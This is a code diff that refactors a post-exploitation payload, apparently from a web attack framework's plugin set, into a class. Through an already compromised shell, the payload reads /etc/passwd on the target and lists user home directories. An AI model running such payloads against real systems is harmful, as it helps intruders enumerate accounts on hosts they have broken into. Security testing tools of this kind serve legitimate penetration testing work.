@@ -1,15 +1,21 @@
-#REQUIRE_LINUX
 import re
+from plugins.attack.payloads.base_payload import base_payload
 
-result = []
-users = []
+class users_home(base_payload):
+    '''
+    '''
+    def run_read(self):
+        result = []
+        users = []
 
-def parse_users_home( etc_passwd ):
-    user = re.findall('(?<=/home/)(.*?)\:', etc_passwd)
-    if user:
-        return user
-    else:
-        return ''
+        def parse_users_home( etc_passwd ):
+            user = re.findall('(?<=/home/)(.*?)\:', etc_passwd)
+            if user:
+                return user
+            else:
+                return ''
 
-for user in parse_users_home(read('/etc/passwd')):
-    result.append('/home/'+str(user)+'/')
+        for user in parse_users_home(self.shell.read('/etc/passwd')):
+            result.append('/home/'+str(user)+'/')
+        
+        return result
